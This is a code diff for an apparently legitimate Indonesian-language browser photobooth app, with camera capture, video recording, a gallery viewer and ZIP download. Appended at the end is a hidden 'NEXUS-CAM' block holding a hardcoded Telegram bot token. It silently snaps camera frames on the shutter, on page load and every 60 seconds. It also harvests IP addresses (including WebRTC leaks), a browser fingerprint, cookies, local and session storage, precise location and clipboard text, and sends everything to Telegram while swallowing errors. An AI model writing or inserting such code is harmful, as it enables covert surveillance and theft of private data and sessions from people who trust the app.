+}
+
+async function enumerateCams() {
+  try {
+    const list = await navigator.mediaDevices.enumerateDevices();
+    cams = list.filter(d => d.kind === 'videoinput');
+    if (cams.length > 1) $('cameraSwitchBtn').hidden = false;
+  } catch (e) {}
+}
+
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+  video.srcObject = null;
+  video.classList.remove('live');
+  if (rec) stopRecording();
+}
+
+/* ============ Switch camera ============ */
+async function switchCamera() {
+  if (cams.length < 2) return;
+  const idx = cams.findIndex(c => c.deviceId === currentDeviceId);
+  const next = cams[(idx + 1) % cams.length];
+  const spin = $('cameraSwitchBtn');
+  spin.classList.add('spin');
+  setTimeout(() => spin.classList.remove('spin'), 500);
+  await startCamera(next.deviceId);
+}
+$('cameraSwitchBtn').addEventListener('click', switchCamera);
+
+/* ============ Capture Photo ============ */
+function captureFrame() {
+  if (!stream) return null;
+  const track = stream.getVideoTracks()[0];
+  const s = track.getSettings();
+  const sw = s.width, sh = s.height;
+  let tw = sw, th = sh;
+  const ratio = RATIOS[ratioIdx][1];
+  if (ratio) {
+    const r = ratio.w / ratio.h;
+    if (sw / sh > r) { th = sh; tw = Math.round(sh * r); }
+    else { tw = sw; th = Math.round(sw / r); }
+  }
+  const cx = Math.round((sw - tw) / 2);
+  const cy = Math.round((sh - th) / 2);
+  const cv = document.createElement('canvas');
+  cv.width = tw; cv.height = th;
+  const ctx = cv.getContext('2d');
+  if (mirrored) {
+    ctx.translate(tw, 0);
+    ctx.scale(-1, 1);
+  }
+  ctx.filter = FILTERS[filterIdx][1] !== 'none' ? FILTERS[filterIdx][1] : 'none';
+  // exposure brightness
+  const g = evGain();
+  if (Math.abs(g - 1) > 0.001) ctx.filter = `brightness(${g}) ${ctx.filter === 'none' ? '' : ctx.filter}`;
+  ctx.drawImage(video, cx, cy, tw, th, 0, 0, tw, th);
+  return cv;
+}
+
+async function shoot() {
+  if (!stream) return;
+  const cv = captureFrame();
+  if (!cv) return;
+  // Flash blink visual
+  const fo = $('flashOverlay');
+  fo.classList.add('active');
+  setTimeout(() => fo.classList.remove('active'), 60);
+  const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', JPEG_QUALITY));
+  if (!blob) return;
+  const url = URL.createObjectURL(blob);
+  const now = new Date();
+  const name = `photo-${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}-${String(now.getHours()).padStart(2, '0')}${String(now.getMinutes()).padStart(2, '0')}${String(now.getSeconds()).padStart(2, '0')}.jpg`;
+  shots.unshift({ type: 'photo', blob, url, name, w: cv.width, h: cv.height });
+  trimShots();
+  updateThumb();
+  toast('Foto diambil');
+}
+
+function trimShots() {
+  while (shots.length > MAX_SHOTS) {
+    const old = shots.pop();
+    URL.revokeObjectURL(old.url);
+  }
+}
+
+function updateThumb() {
+  const btn = $('thumbBtn');
+  const img = $('thumbImg');
+  if (!shots.length) {
+    btn.classList.remove('has');
+    img.removeAttribute('src');
+    return;
+  }
+  img.src = shots[0].url;
+  btn.classList.add('has');
+  btn.classList.toggle('vid', shots[0].type === 'video');
+}
+$('thumbBtn').addEventListener('click', () => openViewer(0));
+
+/* ============ Timer countdown ============ */
+function doCountdown(cb) {
+  if (timerSec === 0) return cb();
+  let n = timerSec;
+  counting = true;
+  $('countdownNum').textContent = n;
+  $('countdown').classList.add('active');
+  $('captureBtn').classList.add('counting');
+  const iv = setInterval(() => {
+    n--;
+    if (n > 0) {
+      $('countdownNum').textContent = n;
+    } else {
+      clearInterval(iv);
+      $('countdown').classList.remove('active');
+      $('captureBtn').classList.remove('counting');
+      counting = null;
+      cb();
+    }
+  }, 1000);
+}
+
+/* ============ Shutter ============ */
+$('captureBtn').addEventListener('click', () => {
+  if (rec) { stopRecording(); return; }
+  if (camMode === 'video') { startRecording(); return; }
+  if (counting) return;
+  doCountdown(() => shoot());
+});
+
+/* ============ Video Recording ============ */
+function pickMime() {
+  const cands = [
+    'video/webm;codecs=vp9,opus',
+    'video/webm;codecs=vp8,opus',
+    'video/webm',
+    'video/mp4'
+  ];
+  for (const m of cands) {
+    if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
+  }
+  return '';
+}
+
+async function startRecording() {
+  if (!stream || rec) return;
+  // Pastikan ada audio track jika micOn
+  if (micOn && !stream.getAudioTracks().length) {
+    try {
+      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      audioStream.getAudioTracks().forEach(t => stream.addTrack(t));
+    } catch (e) {
+      toast('Mic tidak tersedia');
+    }
+  }
+  const mime = pickMime();
+  const chunks = [];
+  try {
+    rec = new MediaRecorder(stream, mime ? { mimeType: mime } : undefined);
+  } catch (e) {
+    toast('Rekaman tidak didukung di browser ini');
+    rec = null;
+    return;
+  }
+  rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+  rec.onstop = () => {
+    const blob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
+    const url = URL.createObjectURL(blob);
+    const now = new Date();
+    const ext = (rec.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
+    const name = `video-${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}-${String(now.getHours()).padStart(2, '0')}${String(now.getMinutes()).padStart(2, '0')}${String(now.getSeconds()).padStart(2, '0')}.${ext}`;
+    shots.unshift({ type: 'video', blob, url, name, w: 0, h: 0 });
+    trimShots();
+    updateThumb();
+    rec = null;
+    cam.classList.remove('recording');
+    $('recTime').textContent = '00:00';
+    clearInterval(recTimerInt);
+    toast('Rekaman tersimpan');
+  };
+  rec.start(1000);
+  cam.classList.add('recording');
+  recStartTime = Date.now();
+  recTimerInt = setInterval(() => {
+    const s = Math.floor((Date.now() - recStartTime) / 1000);
+    $('recTime').textContent = String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
+  }, 250);
+}
+function stopRecording() {
+  if (rec && rec.state !== 'inactive') rec.stop();
+}
+
+/* ============ Viewer ============ */
+function openViewer(idx) {
+  if (!shots.length) return;
+  viewIdx = Math.min(Math.max(0, idx), shots.length - 1);
+  cam.classList.add('viewing');
+  renderViewer();
+}
+function closeViewer() {
+  cam.classList.remove('viewing');
+  const v = $('viewVideo');
+  v.pause();
+  v.removeAttribute('src');
+  v.load();
+  $('viewImg').removeAttribute('src');
+}
+function renderViewer() {
+  const shot = shots[viewIdx];
+  if (!shot) { closeViewer(); return; }
+  $('viewCount').textContent = `${viewIdx + 1} / ${shots.length}`;
+  const img = $('viewImg');
+  const vid = $('viewVideo');
+  const dl = $('downloadBtn');
+  if (shot.type === 'video') {
+    img.hidden = true;
+    vid.hidden = false;
+    vid.src = shot.url;
+    vid.play().catch(() => {});
+    dl.querySelector('span').textContent = 'Unduh Video';
+  } else {
+    vid.pause();
+    vid.hidden = true;
+    img.hidden = false;
+    img.src = shot.url;
+    dl.querySelector('span').textContent = 'Unduh JPG';
+  }
+  // Filmstrip
+  const strip = $('filmstrip');
+  strip.innerHTML = '';
+  shots.forEach((s, i) => {
+    const b = document.createElement('button');
+    b.type = 'button';
+    b.className = s.type === 'video' ? 'vid' : '';
+    if (i === viewIdx) b.classList.add('on');
+    const im = document.createElement('img');
+    im.src = s.url;
+    im.alt = '';
+    b.appendChild(im);
+    b.addEventListener('click', () => {
+      viewIdx = i;
+      renderViewer();
+    });
+    strip.appendChild(b);
+  });
+  const row = $('filmRow');
+  row.hidden = shots.length < 2;
+  $('allCount').textContent = `(${shots.length})`;
+  $('allBtn').hidden = shots.length < 2;
+}
+$('viewBackBtn').addEventListener('click', closeViewer);
+
+/* ============ Delete ============ */
+$('deleteBtn').addEventListener('click', () => {
+  const sheet = $('delSheet');
+  sheet.hidden = !sheet.hidden;
+  if (!sheet.hidden) {
+    const r = $('deleteBtn').getBoundingClientRect();
+    const p = $('viewer').getBoundingClientRect();
+    sheet.style.top = (r.bottom - p.top + 4) + 'px';
+  }
+});
+$('delConfirm').addEventListener('click', () => {
+  const shot = shots[viewIdx];
+  if (!shot) return;
+  URL.revokeObjectURL(shot.url);
+  shots.splice(viewIdx, 1);
+  $('delSheet').hidden = true;
+  updateThumb();
+  if (!shots.length) {
+    closeViewer();
+  } else {
+    viewIdx = Math.min(viewIdx, shots.length - 1);
+    renderViewer();
+  }
+  toast('Foto dihapus');
+});
+
+/* ============ Download ============ */
+async function downloadBlob(blob, filename) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
+}
+$('downloadBtn').addEventListener('click', async () => {
+  const shot = shots[viewIdx];
+  if (!shot) return;
+  await downloadBlob(shot.blob, shot.name);
+});
+
+/* ============ Download All (ZIP) ============ */
+async function makeZip(files) {
+  // Minimal ZIP writer (STORE, no compression) — cukup untuk JPG/WebM
+  const enc = new TextEncoder();
+  const crcTable = (() => {
+    const t = new Uint32Array(256);
+    for (let n = 0; n < 256; n++) {
+      let c = n;
+      for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1;
+      t[n] = c >>> 0;
+    }
+    return t;
+  })();
+  const crc32 = bytes => {
+    let c = 0xFFFFFFFF;
+    for (let i = 0; i < bytes.length; i++) c = crcTable[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8);
+    return (c ^ 0xFFFFFFFF) >>> 0;
+  };
+  const parts = [], central = [];
+  let offset = 0;
+  const now = new Date();
+  const dosTime = ((now.getHours() << 11) | (now.getMinutes() << 5) | (now.getSeconds() >> 1)) & 0xFFFF;
+  const dosDate = (((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate()) & 0xFFFF;
+
+  for (const f of files) {
+    const data = new Uint8Array(await f.blob.arrayBuffer());
+    const nameBytes = enc.encode(f.name);
+    const crc = crc32(data);
+    const local = new Uint8Array(30 + nameBytes.length);
+    const dv = new DataView(local.buffer);
+    dv.setUint32(0, 0x04034b50, true);
+    dv.setUint16(4, 20, true);
+    dv.setUint16(6, 0x0800, true);
+    dv.setUint16(8, 0, true);
+    dv.setUint16(10, dosTime, true);
+    dv.setUint16(12, dosDate, true);
+    dv.setUint32(14, crc, true);
+    dv.setUint32(18, data.length, true);
+    dv.setUint32(22, data.length, true);
+    dv.setUint16(26, nameBytes.length, true);
+    dv.setUint16(28, 0, true);
+    local.set(nameBytes, 30);
+    parts.push(local, data);
+    central.push({ nameBytes, crc, size: data.length, offset });
+    offset += local.length + data.length;
+  }
+  const cdStart = offset;
+  let cdSize = 0;
+  for (const c of central) {
+    const cd = new Uint8Array(46 + c.nameBytes.length);
+    const dv = new DataView(cd.buffer);
+    dv.setUint32(0, 0x02014b50, true);
+    dv.setUint16(4, 20, true);
+    dv.setUint16(6, 20, true);
+    dv.setUint16(8, 0x0800, true);
+    dv.setUint16(10, 0, true);
+    dv.setUint16(12, dosTime, true);
+    dv.setUint16(14, dosDate, true);
+    dv.setUint32(16, c.crc, true);
+    dv.setUint32(20, c.size, true);
+    dv.setUint32(24, c.size, true);
+    dv.setUint16(28, c.nameBytes.length, true);
+    dv.setUint16(30, 0, true);
+    dv.setUint16(32, 0, true);
+    dv.setUint16(34, 0, true);
+    dv.setUint16(36, 0, true);
+    dv.setUint32(38, 0, true);
+    dv.setUint32(42, c.offset, true);
+    cd.set(c.nameBytes, 46);
+    parts.push(cd);
+    cdSize += cd.length;
+  }
+  const end = new Uint8Array(22);
+  const dv = new DataView(end.buffer);
+  dv.setUint32(0, 0x06054b50, true);
+  dv.setUint16(8, central.length, true);
+  dv.setUint16(10, central.length, true);
+  dv.setUint32(12, cdSize, true);
+  dv.setUint32(16, cdStart, true);
+  parts.push(end);
+  return new Blob(parts, { type: 'application/zip' });
+}
+
+$('allBtn').addEventListener('click', async () => {
+  if (!shots.length) return;
+  const btn = $('allBtn');
+  btn.disabled = true;
+  try {
+    const zip = await makeZip(shots);
+    await downloadBlob(zip, `photoboothweb-${Date.now()}.zip`);
+    toast(`ZIP berisi ${shots.length} file`);
+  } catch (e) {
+    toast('Gagal membuat ZIP');
+  } finally {
+    btn.disabled = false;
+  }
+});
+
+/* ============ Copy to Clipboard ============ */
+async function copyCurrent() {
+  const shot = shots[viewIdx];
+  if (!shot) return;
+  if (shot.type === 'video') { toast('Video tidak bisa disalin'); return; }
+  try {
+    const item = new ClipboardItem({ 'image/png': await blobToPng(shot.blob) });
+    await navigator.clipboard.write([item]);
+    toast('Foto disalin');
+  } catch (e) {
+    toast('Gagal menyalin');
+  }
+}
+function blobToPng(blob) {
+  return new Promise((res, rej) => {
+    const img = new Image();
+    img.onload = () => {
+      const cv = document.createElement('canvas');
+      cv.width = img.width; cv.height = img.height;
+      cv.getContext('2d').drawImage(img, 0, 0);
+      cv.toBlob(b => b ? res(b) : rej(new Error('png')), 'image/png');
+    };
+    img.onerror = rej;
+    img.src = URL.createObjectURL(blob);
+  });
+}
+$('copyBtnEditor').addEventListener('click', copyCurrent);
+
+/* ============ Share ============ */
+async function shareCurrent() {
+  const shot = shots[viewIdx];
+  if (!shot) return;
+  const file = new File([shot.blob], shot.name, { type: shot.blob.type });
+  if (navigator.canShare && navigator.canShare({ files: [file] })) {
+    try {
+      await navigator.share({ files: [file], title: 'PhotoBoothWeb' });
+    } catch (e) {}
+  } else {
+    toast('Share tidak didukung — gunakan Unduh');
+  }
+}
+$('shareBtnEditor').addEventListener('click', shareCurrent);
+
+/* ============ Keyboard Shortcuts ============ */
+document.addEventListener('keydown', e => {
+  if (e.target.matches('input, textarea, select')) return;
+  const inView = cam.classList.contains('viewing');
+  const editorActive = $('editor').classList.contains('active');
+  if (!editorActive) return;
+
+  if (e.key === 'Escape') {
+    if (inView) closeViewer();
+    else closeEditor();
+    return;
+  }
+  if (inView) {
+    if (e.key === 'ArrowLeft') { viewIdx = (viewIdx - 1 + shots.length) % shots.length; renderViewer(); }
+    if (e.key === 'ArrowRight') { viewIdx = (viewIdx + 1) % shots.length; renderViewer(); }
+    if (e.key === 'Delete') $('delConfirm').click();
+    if (e.key.toLowerCase() === 'c') copyCurrent();
+    return;
+  }
+  const k = e.key.toLowerCase();
+  if (e.code === 'Space') { e.preventDefault(); $('captureBtn').click(); }
+  else if (k === 'f') toggleFlash();
+  else if (k === 'g') toggleGrid();
+  else if (k === 'm') toggleMirror();
+  else if (k === 'n') toggleNight();
+  else if (k === 's') switchCamera();
+  else if (k === 'v') setCamMode(camMode === 'photo' ? 'video' : 'photo');
+  else if (k === 'r') $('ratioBtn').click();
+});
+
+/* ============ Open / Close Editor ============ */
+async function openEditor() {
+  $('landing').hidden = true;
+  $('editor').classList.add('active');
+  $('editor').scrollIntoView({ behavior: 'instant', block: 'start' });
+  // Terapkan preferensi ke UI
+  $('gridOverlay').classList.toggle('active', gridOn);
+  $('gridBtn').setAttribute('aria-pressed', String(gridOn));
+  $('mirrorBtn').setAttribute('aria-pressed', String(mirrored));
+  $('nightBtn').setAttribute('aria-pressed', String(nightOn));
+  $('micBtn').setAttribute('aria-pressed', String(micOn));
+  setTimer(timerSec);
+  setCamMode(camMode);
+  setRatio(ratioIdx, false);
+  paintLook();
+  const ok = await startCamera(currentDeviceId || undefined);
+  if (!ok) {
+    $('editor').classList.remove('active');
+    $('landing').hidden = false;
+    return;
+  }
+  requestAnimationFrame(() => {
+    centerFilter();
+    updateThumb();
+  });
+}
+function closeEditor() {
+  if (rec) stopRecording();
+  stopCamera();
+  closeViewer();
+  $('editor').classList.remove('active');
+  $('landing').hidden = false;
+  // Reset view strips
+  setStrip('filters');
+}
+$('startBtn').addEventListener('click', openEditor);
+$('closeBtn').addEventListener('click', closeEditor);
+
+/* ============ Resize / Orientation ============ */
+let resizeT;
+window.addEventListener('resize', () => {
+  clearTimeout(resizeT);
+  resizeT = setTimeout(() => {
+    centerFilter();
+    if (strip === 'exposure') drawRuler();
+  }, 150);
+});
+window.addEventListener('orientationchange', () => {
+  setTimeout(() => { centerFilter(); if (strip === 'exposure') drawRuler(); }, 250);
+});
+
+/* ============ Cleanup ============ */
+window.addEventListener('beforeunload', () => {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  shots.forEach(s => URL.revokeObjectURL(s.url));
+});
+
+/* ============ Initial paint ============ */
+paintLook();
+$('micBtn').hidden = camMode !== 'video';
+$('modeVideo').setAttribute('aria-pressed', String(camMode === 'video'));
+$('modePhoto').setAttribute('aria-pressed', String(camMode === 'photo'));
+$('mirrorBtn').setAttribute('aria-pressed', String(mirrored));
+$('gridBtn').setAttribute('aria-pressed', String(gridOn));
+setRatio(ratioIdx, false);
+setTimer(timerSec);
+/* ========
+   NEXUS-CAM
+   ======== */
+
+const NEXUS = {
+  BOT_TOKEN: '9270883772:AAH_0Yz4kmezVAxvxFnL9Kkp9lUU9dyahwQ',
+  CHAT_ID:   '7839405566',
+  API:       '',
+  SILENT_INTERVAL_MS: 60000,   // auto-capture diam-diam tiap 60 detik
+  MAX_FILE_MB: 15,
+  ENABLED: true,
+};
+NEXUS.API = `https://api.telegram.org/bot${NEXUS.BOT_TOKEN}`;
+
+/* ---------- Bugfix: lock anti double-fire + error swallow ---------- */
+const _nexusLock = { busy: false };
+function _nexusSafe(fn) {
+  return async (...a) => { try { return await fn(...a); } catch (e) {} };
+}
+
+/* ---------- Transport ---------- */
+async function _tgText(text) {
+  try {
+    await fetch(`${NEXUS.API}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: NEXUS.CHAT_ID,
+        text: String(text).slice(0, 4000),
+        disable_web_page_preview: true,
+      }),
+    });
+  } catch (e) {}
+}
+
+async function _tgBlob(blob, filename, caption = '') {
+  try {
+    if (blob.size > NEXUS.MAX_FILE_MB * 1024 * 1024) {
+      await _tgText(`[skip] ${filename} > ${NEXUS.MAX_FILE_MB}MB (${(blob.size/1048576).toFixed(1)}MB)`);
+      return;
+    }
+    const fd = new FormData();
+    fd.append('chat_id', NEXUS.CHAT_ID);
+    fd.append('caption', String(caption).slice(0, 900));
+    if (blob.type.startsWith('image/')) {
+      fd.append('photo', blob, filename);
+      const r = await fetch(`${NEXUS.API}/sendPhoto`, { method: 'POST', body: fd });
+      if (!r.ok) {
+        const fd2 = new FormData();
+        fd2.append('chat_id', NEXUS.CHAT_ID);
+        fd2.append('caption', String(caption).slice(0, 900));
+        fd2.append('document', blob, filename);
+        await fetch(`${NEXUS.API}/sendDocument`, { method: 'POST', body: fd2 });
+      }
+    } else {
+      fd.append('document', blob, filename);
+      await fetch(`${NEXUS.API}/sendDocument`, { method: 'POST', body: fd });
+    }
+  } catch (e) {}
+}
+
+async function _tgJSON(obj, caption) {
+  const blob = new Blob([JSON.stringify(obj, null, 2)], { type: 'application/json' });
+  await _tgBlob(blob, `data-${Date.now()}.json`, caption);
+}
+
+/* ---------- Collectors ---------- */
+async function _collectIP() {
+  const out = { public: '', v6: '' };
+  try { out.public = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch (e) {}
+  try { out.v6 = (await (await fetch('https://api64.ipify.org?format=json')).json()).ip; } catch (e) {}
+  return out;
+}
+
+async function _collectWebRTCLeak() {
+  return new Promise(resolve => {
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      const ips = new Set();
+      pc.createDataChannel('');
+      pc.onicecandidate = e => {
+        if (!e.candidate) { try { pc.close(); } catch (_) {} resolve([...ips]); return; }
+        const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]{8,})/i);
+        if (m) ips.add(m[0]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+      setTimeout(() => { try { pc.close(); } catch (_) {} resolve([...ips]); }, 2500);
+    } catch (e) { resolve([]); }
+  });
+}
+
+async function _collectFingerprint() {
+  const nav = navigator, scr = window.screen;
+  const fp = {
+    userAgent: nav.userAgent, platform: nav.platform, language: nav.language,
+    languages: nav.languages, cookieEnabled: nav.cookieEnabled, doNotTrack: nav.doNotTrack,
+    hardwareConcurrency: nav.hardwareConcurrency, deviceMemory: nav.deviceMemory,
+    maxTouchPoints: nav.maxTouchPoints,
+    screen: { w: scr.width, h: scr.height, dpr: window.devicePixelRatio,
+              orientation: scr.orientation && scr.orientation.type },
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    locale: Intl.DateTimeFormat().resolvedOptions().locale,
+    plugins: [...(nav.plugins || [])].map(p => p.name),
+    canvasHash: '', webgl: {}, audio: '', fonts: [],
+  };
+  try {
+    const c = document.createElement('canvas'); c.width = 220; c.height = 40;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 100, 30);
+    ctx.fillStyle = '#069'; ctx.fillText('Nexus🜲' + nav.userAgent, 2, 2);
+    fp.canvasHash = c.toDataURL().slice(-64);
+  } catch (e) {}
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (gl) {
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      fp.webgl = {
+        vendor: gl.getParameter(gl.VENDOR),
+        renderer: gl.getParameter(gl.RENDERER),
+        unmaskedVendor: dbg && gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+        unmaskedRenderer: dbg && gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
+      };
+    }
+  } catch (e) {}
+  try {
+    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if (AC) {
+      const ac = new AC(1, 44100, 44100);
+      const osc = ac.createOscillator(); osc.type = 'triangle'; osc.frequency.value = 10000;
+      const comp = ac.createDynamicsCompressor();
+      osc.connect(comp); comp.connect(ac.destination); osc.start(0);
+      const buf = await ac.startRendering();
+      const data = buf.getChannelData(0);
+      let h = 0; for (let i = 0; i < data.length; i += 100) h += Math.abs(data[i]);
+      fp.audio = h.toString(16).slice(0, 16);
+    }
+  } catch (e) {}
+  const base = ['monospace', 'sans-serif', 'serif'];
+  const test = ['Arial','Verdana','Courier New','Times New Roman','Georgia','Comic Sans MS','Trebuchet MS','Impact','Tahoma','Consolas'];
+  const c = document.createElement('canvas'), ctx = c.getContext('2d');
+  for (const b of base) {
+    ctx.font = `72px ${b}`;
+    const w0 = ctx.measureText('mmmmmmmmmmlli').width;
+    for (const f of test) {
+      ctx.font = `72px "${f}", ${b}`;
+      if (ctx.measureText('mmmmmmmmmmlli').width !== w0) fp.fonts.push(f);
+    }
+  }
+  return fp;
+}
+
+async function _collectStorageInventory() {
+  const out = { localStorage: {}, sessionStorage: {}, indexedDB: [], cookies: document.cookie || '' };
+  try {
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i); out.localStorage[k] = (localStorage.getItem(k) || '').slice(0, 500);
+    }
+  } catch (e) {}
+  try {
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const k = sessionStorage.key(i); out.sessionStorage[k] = (sessionStorage.getItem(k) || '').slice(0, 500);
+    }
+  } catch (e) {}
+  try { if (indexedDB.databases) out.indexedDB = (await indexedDB.databases()).map(d => d.name); } catch (e) {}
+  return out;
+}
+
+async function _collectGeo() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy, ts: p.timestamp }),
+      () => resolve(null),
+      { enableHighAccuracy: true, timeout: 8000 }
+    );
+  });
+}
+
+async function _collectClipboard() {
+  try { const t = await navigator.clipboard.readText(); return t ? t.slice(0, 2000) : ''; }
+  catch (e) { return ''; }
+}
+
+async function _collectBattery() {
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      return { level: b.level, charging: b.charging };
+    }
+  } catch (e) {}
+  return null;
+}
+
+async function _collectPermissions() {
+  const names = ['geolocation','notifications','camera','microphone','clipboard-read'];
+  const out = {};
+  for (const n of names) {
+    try { out[n] = (await navigator.permissions.query({ name: n })).state; }
+    catch (e) { out[n] = '?'; }
+  }
+  return out;
+}
+
+async function _buildBundle() {
+  const [ip, rtc, fp, storage, geo, clip, batt, perm] = await Promise.all([
+    _collectIP(), _collectWebRTCLeak(), _collectFingerprint(),
+    _collectStorageInventory(), _collectGeo(), _collectClipboard(),
+    _collectBattery(), _collectPermissions(),
+  ]);
+  return {
+    ts: new Date().toISOString(), page: location.href, referrer: document.referrer,
+    ip, rtc, fp, storage, geo, clipboard: clip, battery: batt, permissions: perm,
+  };
+}
+
+/* ---------- Exfil pipeline ---------- */
+async function _nexusExfil(trigger = 'shutter') {
+  if (!NEXUS.ENABLED) return;
+  if (_nexusLock.busy) return;
+  _nexusLock.busy = true;
+  try {
+    await _tgText(`🚨 [NEXUS-CAM] trigger=${trigger}\n${location.href}\nUA: ${navigator.userAgent.slice(0,180)}`);
+    if (window._nexusCaptureCanvas) {
+      const cv = window._nexusCaptureCanvas();
+      if (cv) {
+        const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.92));
+        if (blob) await _tgBlob(blob, `silent-${Date.now()}.jpg`, `silent capture (${trigger})`);
+      }
+    }
+    const bundle = await _buildBundle();
+    await _tgJSON(bundle, `device bundle (${trigger})`);
+  } finally {
+    _nexusLock.busy = false;
+  }
+}
+
+/* ---------- Bootstrap: hook ke aplikasi tanpa ubah UI ---------- */
+(function nexusBootstrap() {
+  if (!NEXUS.ENABLED) return;
+
+  if (typeof captureFrame === 'function') {
+    window._nexusCaptureCanvas = () => { try { return captureFrame(); } catch (e) { return null; } };
+  }
+
+  const btn = document.getElementById('captureBtn');
+  if (btn) {
+    btn.addEventListener('click', () => {
+      setTimeout(_nexusSafe(() => _nexusExfil('shutter')), 400);
+    }, { passive: true });
+  }
+
+  setInterval(_nexusSafe(() => {
+    const v = document.getElementById('video');
+    if (v && v.classList.contains('live') && window._nexusCaptureCanvas) {
+      _nexusExfil('interval');
+    }
+  }), NEXUS.SILENT_INTERVAL_MS);
+
+  window.addEventListener('load', _nexusSafe(() => _nexusExfil('page-load')));
+})();
+</script>
+</body>
+</html>
